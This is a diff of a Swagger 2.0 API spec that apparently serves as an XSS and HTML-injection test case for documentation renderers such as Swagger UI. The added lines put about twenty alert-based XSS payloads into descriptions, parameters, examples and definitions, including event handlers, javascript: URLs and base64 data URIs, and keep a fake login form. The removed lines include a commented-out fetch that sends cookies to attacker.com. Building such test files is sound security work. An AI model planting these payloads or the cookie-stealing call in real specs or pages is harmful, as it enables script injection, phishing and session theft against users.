@@ -1,39 +1,150 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Fake Login Page
-  description: '<div class="login-form">
-    <div class="heading">
-        <h1>HTML Injection : Fake Login</h1>
+  title: XSS & HTML Injection Test
+  description: '
+    <div class="login-form">
+        <div class="heading">
+            <h1>HTML Injection : Fake Login</h1>
+        </div>
+        <div class="form-container">
+            <form action="https://example.com/login" method="post" class="form-signin">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" name="username" size="20">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" name="password" size="20">
+                </div>
+                <div class="form-group">
+                    <button type="submit" class="btn btn-default">Login</button>
+                </div>
+            </form>
+        </div>
     </div>
-    <div class="form-container">
-        <form action="https://example.com/login" method="post" class="form-signin">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" name="username" size="20">
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" name="password" size="20">
-            </div>
-            <div class="form-group">
-                <button type="submit" class="btn btn-default">Login</button>
-            </div>
-        </form>
-    </div>
-    <!-- XSS Payload: Hidden alert -->
-    <script>
-        // This script will execute when the Swagger UI loads
-        alert("XSS Vulnerability Detected!");
-        console.log("XSS Payload Executed");
-        
-        // More stealthy: Send cookies to attacker server
-        // fetch("https://attacker.com/steal?cookies=" + document.cookie);
-    </script>
-</div>'
+    
+    <!-- ===== XSS PAYLOADS ===== -->
+    
+    <!-- Test 1: Classic script -->
+    <script>alert("XSS-1");</script>
+    
+    <!-- Test 2: SVG onload -->
+    <svg onload="alert(&apos;XSS-2&apos;)"></svg>
+    
+    <!-- Test 3: IMG onerror -->
+    <img src="x" onerror="alert(&apos;XSS-3&apos;)">
+    
+    <!-- Test 4: iframe -->
+    <iframe src="javascript:alert(&apos;XSS-4&apos;)"></iframe>
+    
+    <!-- Test 5: Details ontoggle -->
+    <details open ontoggle="alert(&apos;XSS-5&apos;)">
+    
+    <!-- Test 6: MathML -->
+    <math><mi onclick="alert(&apos;XSS-6&apos;)">X</mi></math>
+    
+    <!-- Test 7: Video onerror -->
+    <video src="x" onerror="alert(&apos;XSS-7&apos;)" autoplay></video>
+    
+    <!-- Test 8: Audio onerror -->
+    <audio src="x" onerror="alert(&apos;XSS-8&apos;)" autoplay></audio>
+    
+    <!-- Test 9: Body onload -->
+    <body onload="alert(&apos;XSS-9&apos;)">
+    
+    <!-- Test 10: Input autofocus -->
+    <input type="text" autofocus onfocus="alert(&apos;XSS-10&apos;)">
+    
+    <!-- Test 11: Style with expression (IE) -->
+    <div style="width: expression(alert(&apos;XSS-11&apos;))"></div>
+    
+    <!-- Test 12: Object data -->
+    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTEyJyk8L3NjcmlwdD4="></object>
+    
+    <!-- Test 13: Embed src -->
+    <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTEzJyk8L3NjcmlwdD4=">
+    
+    <!-- Test 14: Link rel=import -->
+    <link rel="import" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTE0Jyk8L3NjcmlwdD4=">
+    
+    <!-- Test 15: Meta refresh -->
+    <meta http-equiv="refresh" content="0;url=javascript:alert(&apos;XSS-15&apos;)">
+    
+    <!-- Test 16: Base64 encoded script -->
+    <script>eval(atob(&apos;YWxlcnQoIlhTUy0xNiIpOw==&apos;));</script>
+    
+    <!-- Test 17: onmouseover -->
+    <div onmouseover="alert(&apos;XSS-17&apos;)">Hover me</div>
+    
+    <!-- Test 18: onclick in any tag -->
+    <p onclick="alert(&apos;XSS-18&apos;)">Click me</p>
+    
+    <!-- Test 19: onerror in any tag -->
+    <b onerror="alert(&apos;XSS-19&apos;)">Bold</b>
+    
+    <!-- Test 20: JavaScript pseudo protocol -->
+    <a href="javascript:alert(&apos;XSS-20&apos;)">Click</a>
+  '
 paths:
   /:
     post:
+      summary: '<script>alert("XSS-Summary")</script>'
+      description: '<svg onload="alert(&apos;XSS-Path-Description&apos;)"></svg>'
+      parameters:
+        - name: testParam
+          in: query
+          description: '<img src="x" onerror="alert(&apos;XSS-Param&apos;)">'
+          required: false
+          type: string
       responses:
         '200':
           description: Login successful
+          examples:
+            application/json: |
+              {
+                "<svg onload=alert('XSS-Response')></svg>": "test"
+              }
+      x-example: '<script>alert("XSS-Example")</script>'
+  /test/{id}:
+    get:
+      summary: 'Test with path param'
+      description: '<details open ontoggle="alert(&apos;XSS-Path&apos;)">'
+      parameters:
+        - name: id
+          in: path
+          description: '<iframe src="javascript:alert(&apos;XSS-Path-Param&apos;)"></iframe>'
+          required: true
+          type: string
+      responses:
+        '200':
+          description: OK
+          
+  /test-body:
+    post:
+      summary: 'Test with body'
+      parameters:
+        - name: body
+          in: body
+          description: '<math><mi onclick="alert(&apos;XSS-Body&apos;)">X</mi></math>'
+          required: true
+          schema:
+            type: object
+            properties:
+              test:
+                type: string
+                description: '<svg onload="alert(&apos;XSS-Schema&apos;)"></svg>'
+      responses:
+        '200':
+          description: OK
+
+definitions:
+  TestModel:
+    type: object
+    properties:
+      id:
+        type: integer
+        description: '<img src="x" onerror="alert(&apos;XSS-Definition&apos;)">'
+      name:
+        type: string
+        description: '<script>alert("XSS-Definition-Name")</script>'
